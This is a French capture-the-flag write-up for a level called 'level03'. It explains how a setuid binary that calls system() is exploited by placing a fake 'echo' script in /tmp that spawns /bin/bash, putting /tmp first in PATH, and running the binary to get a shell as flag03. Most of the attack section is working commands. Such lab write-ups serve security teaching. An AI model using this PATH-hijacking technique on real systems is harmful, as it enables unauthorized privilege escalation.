# Exploitation du niveau flag03

## 1. Analyse de l'ex√©cutable level03

En listant les fichiers du r√©pertoire, nous trouvons :

```sh
ls
level03
```

En effectuant une analyse en reverse engineering, nous identifions les fonctions appel√©es dans l‚Äôex√©cutable :

```sh
getegid@plt  
geteuid@plt  
setresgid@plt  
setresuid@plt  
system@plt  
```

## 2. Comprendre l‚Äôexploitation possible

setresgid / setresuid : Ces appels permettent d‚Äôex√©cuter le programme avec les privil√®ges du propri√©taire du fichier, et non ceux de l‚Äôutilisateur actuel.
system() : Cette fonction ex√©cute une commande syst√®me, ce qui peut √™tre exploit√© en manipulant la variable d‚Äôenvironnement PATH.

Le but est d‚Äôexploiter l‚Äôappel de system() pour ex√©cuter un shell avec les privil√®ges de flag03.

## 3. Cr√©ation d‚Äôun script malveillant et modification du PATH

Nous allons cr√©er un faux echo qui, au lieu d‚Äôafficher du texte, ouvrira un shell.

üìå Cr√©er un script dans /tmp (seul endroit o√π nous pouvons √©crire)

```sh
echo '#!/bin/bash' > /tmp/echo
echo '/bin/bash' >> /tmp/echo
chmod +x /tmp/echo
```

Nous modifions la variable PATH pour qu‚Äôelle prenne en priorit√© notre version de echo :

```sh
export PATH="/tmp:$PATH"
```

## 4. Ex√©cution de level03

Nous ex√©cutons ensuite l‚Äôex√©cutable level03 :

./level03

Gr√¢ce √† la modification du PATH, lorsqu‚Äôil appelle echo, c‚Äôest notre script qui s‚Äôex√©cute, ouvrant un shell avec les droits de flag03.

## 5. V√©rification de l‚Äôutilisateur et r√©cup√©ration du flag

```sh
whoami
flag03
getflag
```
